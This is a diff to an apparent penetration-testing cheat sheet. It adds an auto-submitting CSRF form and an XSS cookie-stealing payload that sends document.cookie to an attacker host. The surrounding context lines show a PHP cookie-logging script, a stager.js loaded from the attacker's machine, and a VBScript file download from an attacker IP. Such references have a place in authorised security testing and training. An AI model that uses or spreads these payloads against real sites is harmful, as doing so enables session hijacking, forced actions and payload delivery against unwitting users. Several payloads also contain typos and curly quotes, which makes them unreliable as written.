@@ -1806,6 +1806,26 @@ cscript wget.vbs http://attacker_IP/path/to/file outfile_here
 ```
 
 
+## CSRF
+```html
+<html>
+    <head></head>
+    <body>
+
+        <form action="http://vulnerable.site/vuln_form.php" method="POST">
+            <input type="hidden" name="param1" value="value1">
+            <input type="hidden" name="param2" value="value2">
+        </form>
+
+        <script>
+            document.forms[0].submit();
+        </script>
+
+    </body>
+</html>
+```
+
+
 
 ## CURL
 ```bash
@@ -6137,7 +6157,7 @@ xprobe2 -v -p tcp:port_here:open IP_here
 
 
 ## XSS
-```javascript
+```php
 # cookie stealer (PHP)
 ## setup cookie stealer on attacker box
 nano cookie.php
@@ -6147,16 +6167,21 @@ $file = fopen('stolen_cookies.txt', 'a+');
 fwrite($file, 'Cookie: ' .$cookie,"\r\n");
 fclose($file);
 ?>
+
 ## serve cookie stealer
 sudo python -m SimpleHTTPServer 80
 ## XSS payload to place on victim site
 <script>newImage().src="http://attacker_IP_here/cookie.php?c="document.cookie;</script>
 ## cookies get written to stolen_cookies.txt or observe traffic in wireshark
+
 ## alternative cookie stealer payload
 <script>
 var i=new Image();
 i.src="http://attacker_IP_here/cookie.php?c="%2bdocument.cookie; # plus concatenation to any other string that might be passed here
 </script>
+
+## alternative
+<script type=“text/javascript”>document.location=“http://attacker_IP_here/cookie.php?c="+document.cookie;</script>
 
 # grab stager script
 <script src="http://attacker_IP_here/stager.js"></script>
